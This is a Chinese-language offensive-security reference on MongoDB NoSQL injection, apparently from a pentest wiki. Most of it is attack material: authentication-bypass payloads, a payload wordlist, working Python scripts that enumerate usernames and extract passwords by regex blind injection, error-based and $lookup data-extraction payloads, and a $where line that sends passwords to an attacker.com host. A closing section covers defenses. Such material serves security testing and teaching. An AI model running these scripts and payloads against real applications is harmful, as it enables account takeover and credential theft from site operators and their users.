---
attack_surface: [注入类]
impact: [身份伪造, 权限提升, 信息泄露, 远程代码执行]
risk_level: 严重
prerequisites:
  - MongoDB 基础语法
  - HTTP 协议基础
  - NoSQL 与 SQL 的概念差异
difficulty: 中级
related_techniques:
  - sql-injection
  - ldap-injection
  - orm-injection
  - rsql-injection
  - xpath-injection
  - ssrf-server-side-request-forgery
tools:
  - nosqli
  - NoSQL-Attack-Suite
  - Burp Suite
  - curl
---

# NoSQL Injection — MongoDB 操作符注入与盲注

> 关联文档：[SQL Injection](../SQL%20Injection/README.md) · [LDAP Injection](../LDAP%20Injection/README.md) · [ORM Injection](../ORM%20Injection/README.md) · [SSRF](../../Reflected%20Values/SSRF/README.md)

---

# 0x01 背景与原理

## 1.1 什么是 NoSQL Injection

NoSQL Injection 是指攻击者通过操纵 NoSQL 数据库查询中使用的用户输入，绕过认证或提取未授权数据。核心问题在于：**应用将用户输入直接拼接到 NoSQL 查询中，而 NoSQL 数据库允许在查询中使用特殊操作符（如 `$ne`、`$gt`、`$regex`、`$where`）**。

## 1.2 为什么会发生

**根因**：许多 NoSQL 数据库（尤其是 MongoDB）使用 JSON-like 的查询语法，如果应用允许用户输入的 JSON 结构与查询对象直接合并（如 `Object.assign(query, req.body)`），攻击者可以注入 MongoDB 操作符。

```javascript
// 漏洞代码示例
app.post('/login', (req, res) => {
  const query = { username: req.body.username, password: req.body.password };
  db.collection('users').findOne(query, ...);  // ← 未消毒的用户输入直接成为查询
});

// 攻击请求: POST { "username": "admin", "password": {"$ne": ""} }
// 实际查询: { username: "admin", password: {"$ne": ""} }
// $ne 表示 "不等于空字符串" → 总是 true → 绕过认证
```

## 1.3 适用数据库

| 数据库 | 查询语法 | 注入方式 |
|--------|---------|---------|
| MongoDB | JSON-like, 支持 `$` 操作符 | `$ne`、`$gt`、`$lt`、`$regex`、`$where` |
| CouchDB | JavaScript View 函数 | `Function()` 执行 JS |
| Cassandra | CQL | CQL 拼接注入 |
| Redis | Lua Scripting | `EVAL` 注入 |
| DynamoDB | AWS API | Expression 注入 |

本文聚焦 MongoDB（最常见）。

---

# 0x02 认证绕过

## 2.1 基本操作符绕过

最经典的 NoSQL 认证绕过：通过注入 MongoDB 操作符，使 WHERE 条件总是为真。

```javascript
// Payload — POST JSON body
// 用户名和密码字段都注入 $ne
{"username": {"$ne": ""}, "password": {"$ne": ""}}
// 实际查询: {username: {$ne: ""}, password: {$ne: ""}}
// 语义: username != "" AND password != "" → 第一条文档满足即为 true

// 只注单字段
{"username": "admin", "password": {"$gt": ""}}
// 语义: password > "" → 只要 password 存在且非空即为 true

// 使用 $in 操作符
{"username": {"$in": ["admin", "root", "user"]}, "password": {"$ne": ""}}
// 语义: username ∈ ["admin","root","user"] → 暴力匹配常见管理员用户名
```

## 2.2 $regex 正则绕过

```javascript
// 匹配用户名以 "admin" 开头
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

// 正则盲注 — 逐字符猜测用户名
{"username": {"$regex": "^a.*"}, "password": {"$ne": ""}}   // "a" 开头?
{"username": {"$regex": "^ad.*"}, "password": {"$ne": ""}}  // "ad" 开头?
// ...→ 最终提取完整用户名
```

## 2.3 $where 操作符（JS 代码执行）

`$where` 将字符串作为 JavaScript 执行，是最危险的操作符：

```javascript
// 条件永远为真
{"$where": "1 == 1"}

// 睡眠时间差盲注
{"$where": "sleep(5000) || true"}

// 通过 $where 提取数据
{"$where": "this.username.length == 5 && this.username[0] == 'a'"}
```

> `$where` 的性能极差（每个文档都需要执行 JS），且需要数据库 level 权限。但如果可用，攻击面极大。

## 2.4 `$func` 操作符 (MongoLite / Cockpit CMS RCE)

[MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite) 库（Cockpit CMS 默认使用）的 `$func` 操作符允许调用任意 PHP 函数：

```python
# 注入 $func 操作符 → 调用 PHP var_dump() → RCE
"user": {"$func": "var_dump"}
```

此漏洞曾在 [Cockpit CMS 实际利用](https://swarm.ptsecurity.com/rce-cockpit-cms/) 中导致未认证远程代码执行。Cockpit CMS 的 `auth_check()` 函数直接将用户输入传给 MongoLite 的 `findOne()`，攻击者注入 `$func` 操作符即可执行任意 PHP 函数。

![Cockpit CMS auth_check 漏洞代码截图](https://swarm.ptsecurity.com/wp-content/uploads/2021/04/cockpit_auth_check_10.png)

> **条件**：目标需使用 MongoLite 库（Cockpit CMS ≤ 0.11.1 默认依赖）。

## 2.5 MongoDB Payload 全集

以下 Payload 来自 [cr0hn 的 NoSQL 注入字典](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)：

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/index.html)//+%00
' && this.passwordzz.match(/.*/index.html)//+%00
'%20%26%26%20this.password.match(/.*/index.html)//+%00
'%20%26%26%20this.passwordzz.match(/.*/index.html)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

---

# 0x03 盲注提取数据

## 3.1 基于 $regex 的盲注

当没有直接错误回显时，使用 `$regex` 逐字符猜测字段值：

```python
import requests, string

# 提取 password 字段
def extract_field(field_name, url):
    result = ""
    charset = string.ascii_letters + string.digits + "{}_"
    while True:
        found = False
        for ch in charset:
            test = result + ch
            r = requests.post(url, json={
                "username": {"$regex": f"admin"},
                field_name: {"$regex": f"^{test}.*"}
            })
            if "success" in r.text.lower():  # 匹配到该前缀 → 当前字符正确
                result += ch
                found = True
                print(f"[+] {field_name}: {result}")
                break
        if not found or len(result) > 50:
            break
    return result
```

## 3.2 基于 $where 的盲注

```python
import requests

# 利用 $where 的 JS 执行能力逐字符提取
def extract_via_where(field, url):
    result = ""
    for pos in range(1, 50):
        for code in range(32, 127):
            payload = {"$where": f"this.{field}[{pos}] == '{chr(code)}'"}
            r = requests.post(url, json={"query": payload})
            if "exists" in r.text or "found" in r.text:
                result += chr(code)
                print(f"[+] Char {pos}: {chr(code)}")
                break
        else:
            break  # 未匹配到任何字符 → 已到字段尾
    return result
```

## 3.3 通用 JSON POST 盲注脚本

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username = "admin"
password = ""

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|']:  # 排除 regex 特殊字符
            payload = '{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data={'ids': payload}, verify=False)
            if 'OK' in r.text:
                print("Found one more char : %s" % (password + c))
                password += c
```

## 3.4 递归用户名枚举 + 密码提取

完整的自动化登录爆破脚本 — 先通过 `$regex` 递归枚举所有用户名，再逐用户提取密码：

```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\" + c for c in string.punctuation + string.whitespace]

def get_password(username):
    print("Extracting password of " + username)
    params = {"username": username, "password[$regex]": "", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password " + password[1:].replace("\\", "") + " for username " + username)
            return password[1:].replace("\\", "")

def get_usernames(prefix):
    usernames = []
    params = {"username[$regex]": "", "password[$regex]": ".*"}
    for c in possible_chars:
        username = "^" + prefix + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print(username)
            for user in get_usernames(prefix + c):  # 递归枚举
                usernames.append(user)
    return usernames

for u in get_usernames(""):
    get_password(u)
```

## 3.5 Error-Based Blind (JavaScript 错误回显)

在 `$where` 子句中注入 `throw new Error()` 可将整个文档内容通过错误消息回显：

```json
{"$where": "this.username='bob' && this.password=='pwd'; throw new Error(JSON.stringify(this));"}
```

如果应用仅泄露第一个失败文档，使用 `_id` 作为分页游标排除已恢复的文档：

```json
{"$where": "if (this._id > '66d5ef7d01c52a87f75e739c') { throw new Error(JSON.stringify(this)) }"}
```

**条件**：应用需将数据库错误消息暴露给用户（常见于开发/调试模式或错误处理不完整的 API）。

**传统 JavaScript 类型错误法**（某些驱动返回详细 TypeError）：

```javascript
// 条件为真时触发 TypeError → 可观测的分支差异
{"$where": "function() { if (this.password[0] == 'a') undefined[0]; }"}
// 若 password 首字符为 'a' → TypeError（错误消息可区分）
// 否则 → 正常返回 → 布尔 oracle
```

## 3.6 `$lookup` 跨集合聚合注入

如果查询使用了 `aggregate()` 而非 `find()`/`findOne()`，可通过 `$lookup` 操作符读取其他集合的数据：

```json
[
  {
    "$lookup": {
      "from": "users",
      "as": "resultado",
      "pipeline": [
        {
          "$match": {
            "password": {
              "$regex": "^.*"
            }
          }
        }
      ]
    }
  }
]
```

> **注意**：`$lookup` 和其他聚合操作符**仅在应用使用 `aggregate()` 时可用**（而非 `find()`/`findOne()`）。在 REST API 中，聚合端点通常与普通查询端点分离。

## 3.7 绕过前后条件约束 (Syntax Injection)

### JavaScript 真值 + NULL 字节截断

当应用将 Mongo 过滤器作为**字符串**拼接后再解析时，注入 JavaScript 真值或 NULL 字节来中和尾部条件：

```javascript
' || 1 || 'x          // OR 1 = true → 忽略后续条件
' || 1%00             // NULL 字节截断 → 仅部分实现受影响
```

### 重复 Key 注入 (Last-Key-Wins)

当应用通过字符串拼接构造 JSON 过滤器时，某些解析器遵循**最后一个 key 优先**的策略：

```json
// 原始过滤器拼接:
{"username":"<input>","role":"user"}

// 攻击者输入为:
","username":{"$ne":""},"$comment":"dup-key

// 最终过滤器（Last-Key-Wins 解析器）:
{"username":"","username":{"$ne":""},"$comment":"dup-key","role":"user"}
//                        ↑ 第二个 username 覆盖第一个 → $ne:"" 永真
```

> **依赖解析器行为** — 仅在后端拼接 JSON 字符串后解析的场景有效。如果后端始终将查询作为结构化对象处理（无字符串化），此方法不适用。

## 3.8 GraphQL → Mongo 过滤器混淆

GraphQL resolver 将 `args.filter` 直接转发给 `collection.find()` 的场景：

```graphql
query users($f: UserFilter) {
  users(filter: $f) { _id email }
}

# variables → $ne 注入
{ "f": { "$ne": {} } }
```

防御：递归剥离以 `$` 开头的 key、显式映射允许的操作符、使用 schema 校验库（Joi/Zod）。

---

# 0x04 高级利用与 CVE

## 4.1 CVE-2023-28359 — Rocket.Chat

Rocket.Chat 的 NoSQL API 端点存在注入，攻击者通过 `$lookup` 聚合操作符在错误消息中泄露数据。

```
攻击链:
  [未授权 MongoDB 注入] → [$lookup 聚合操作符]
    → [错误消息中包含其他集合的数据] → [信息泄露]
```

## 4.2 CVE-2024-53900 / CVE-2025-23061 — Mongoose

Mongoose ODM 在某些版本中对查询对象的消毒不完整，攻击者可通过精心构造的 JSON 绕过 `sanitizeFilter()` 函数注入 MongoDB 操作符。

```
受影响版本: Mongoose < 8.8.3
攻击向量: 利用 sanitizeFilter 未覆盖的嵌套路径或特殊字段名注入 $ 操作符
```

---

# 0x05 自动化工具

| 工具 | 功能 | 链接 |
|------|------|------|
| **nosqli** | NoSQL Injection CLI 扫描器，支持 Mongo/CouchDB | `npm i -g nosqli` |
| **NoSQL-Attack-Suite** | MongoDB 盲注自动化 (GUI) | [GitHub](https://github.com/C4l1b4n/NoSQL-Attack-Suite) |
| **NoSQL-UserPass-Enum** | 用户名/密码递归枚举工具 | [GitHub](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) |
| **StealthNoSQL** | 隐蔽 NoSQL 注入工具 | [GitHub](https://github.com/ImKKingshuk/StealthNoSQL) |
| **Burp Suite** | 手动/半自动测试 | 内置 |

---

# 0x06 攻击链与联动

## 6.1 认证绕过 → 权限提升 → 数据窃取

```
[NoSQL $ne 绕过登录] → [获取 admin session]
    → [利用 $regex 盲注提取所有用户密码哈希]
    → [可能的 $where 执行 JS → RCE? 依赖 MongoDB 版本与配置]
```

## 6.2 NoSQL → SSRF 联动

如果 MongoDB 实例有出网权限，`$where` 的 JS 执行环境可发起 DNS/HTTP 请求（取决于 MongoDB 版本及 `bind_ip` 配置）：

```javascript
// MongoDB 3.6+ 某些配置下可用
{"$where": "new XMLHttpRequest().open('GET', 'http://attacker.com/' + this.password)"}
```

## 6.3 NoSQL → Denial of Service

```javascript
// 利用 $regex 制造超长匹配
{"username": {"$regex": "(.)*aaaaaaaaaaaaaaaaaaaaaa"}}
// ^ 灾难性回溯 → MongoDB 高 CPU → DoS
```

---

# 0x07 防御策略

1. **永远不要将用户输入直接合并到查询对象中**：
   ```javascript
   // ❌ 危险
   const query = Object.assign({}, req.body);
   // ✅ 安全：显式提取并类型验证
   const username = String(req.body.username);
   const password = String(req.body.password);
   db.find({ username, password });
   ```

2. **剥离或拒绝以 `$` 开头的 key** — 对 `req.body`、`req.query`、`req.params` 递归清理后再交给 ORM

3. **使用 Mongoose 的 `sanitizeFilter()` 消毒用户输入**（确保版本 ≥ 8.8.3 覆盖 CVE-2025-23061）：
   ```javascript
   const sanitizeFilter = require('mongoose').sanitizeFilter;
   const clean = sanitizeFilter(req.body);
   ```

4. **使用 `mongo-sanitize` 或 `express-mongo-sanitize` 中间件**自动移除 `$` 和 `.` 前缀

5. **禁用 `$where` 和服务器端 JavaScript**：
   - 自托管 MongoDB：`--noscripting` 启动参数或配置 `security.javascriptEnabled: false`
   - 优先使用 `$expr` 和类型化查询构建器替代 `$where`

6. **尽早验证数据类型**（Joi / Ajv / Zod）— 期望标量的参数拒绝对象和数组（防止 `[$ne]` 注入）

7. **GraphQL**：通过白名单转换 filter 参数，禁止将未消毒对象直接展开到 Mongo/Mongoose filter

8. **最小权限原则**：数据库用户只授予必要权限（CRUD 白名单集合）

---

# 0x08 参考资料

- [PayloadsAllTheThings — NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [HackTricks — NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [NullSweep — NoSQL Injection Cheat Sheet](https://nullsweep.com/nosql-injection-cheatsheet/)
- [OWASP — Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [Rocket.Chat CVE-2023-28359 — HackerOne Report](https://hackerone.com/reports/1757676)
- [Mongoose sanitizeFilter bypass (CVE-2025-23061)](https://nvd.nist.gov/vuln/detail/CVE-2025-23061)
- [OPSWAT — Technical Discovery of Mongoose CVE-2025-23061 & CVE-2024-53900](https://www.opswat.com/blog/technical-discovery-mongoose-cve-2025-23061-cve-2024-53900)
- [SensePost — NoSQL Error-Based Injection (2025)](https://sensepost.com/blog/2025/nosql-error-based-injection/)
- [SensePost — Getting Rid of Pre and Post Conditions in NoSQL Injections (2025)](https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/)
- [NullSweep — A NoSQL Injection Primer with Mongo](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
- [Websecurify — Hacking Node.js and MongoDB](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb)
- [NoSQL No Injection (Blackhat PDF)](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2Fgit-blob-3b49b5d5a9e16cb1ec0d50cb1e62cb60f3f9155a%2FEN-NoSQL-No-injection-Ron-Shulman-Peleg-Bronshtein-1.pdf?alt=media)
- [MongoDB NoSQL Injection Wordlist (cr0hn)](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)
- [nosqli — CLI 自动化工具](https://github.com/Charlie-belmer/nosqli)
- [Cockpit CMS RCE via $func Operator](https://swarm.ptsecurity.com/rce-cockpit-cms/)
- [Mongoose — sanitizeFilter API](https://mongoosejs.com/docs/6.x/docs/api/mongoose.html)
